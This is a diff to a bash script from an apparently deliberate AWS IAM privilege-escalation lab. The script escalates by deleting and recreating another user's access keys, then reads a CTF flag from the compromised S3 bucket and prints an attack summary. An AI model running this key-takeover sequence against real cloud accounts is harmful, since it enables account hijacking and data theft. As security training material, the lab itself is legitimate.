@@ -269,12 +269,27 @@ else
 fi
 echo ""
 
+echo "Reading CTF flag..."
+FLAG_FILE="/tmp/iam-003-bucket-flag-${ACCOUNT_ID}.txt"
+show_attack_cmd "Attacker" "aws s3 cp s3://$FULL_BUCKET_NAME/flag.txt -"
+FLAG_VALUE=""
+if aws s3 cp s3://$FULL_BUCKET_NAME/flag.txt $FLAG_FILE; then
+    FLAG_VALUE=$(cat $FLAG_FILE)
+    echo -e "\n${GREEN}✓ Successfully retrieved CTF flag!${NC}"
+    echo -e "${YELLOW}Flag:${NC}"
+    echo "$FLAG_VALUE"
+    echo ""
+else
+    echo -e "${YELLOW}Warning: Could not retrieve flag (may not be configured)${NC}"
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER"
@@ -283,6 +298,7 @@ echo "3. Deleted existing key: $KEY_TO_DELETE"
 echo "4. Created new access key: $NEW_ACCESS_KEY_ID"
 echo "5. Switched to target user credentials"
 echo "6. Gained access to S3 bucket: $FULL_BUCKET_NAME"
+echo "7. Captured CTF flag: ${FLAG_VALUE:-<see $FLAG_FILE>}"
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Deleted access key: $KEY_TO_DELETE"
@@ -290,7 +306,7 @@ echo "- Created access key: $NEW_ACCESS_KEY_ID"
 echo "- Downloaded file: $DOWNLOAD_FILE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (DeleteAccessKey + CreateAccessKey) → $TARGET_USER → $FULL_BUCKET_NAME"
+echo -e "  $STARTING_USER → (DeleteAccessKey + CreateAccessKey) → $TARGET_USER → $FULL_BUCKET_NAME → flag.txt (CTF flag)"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
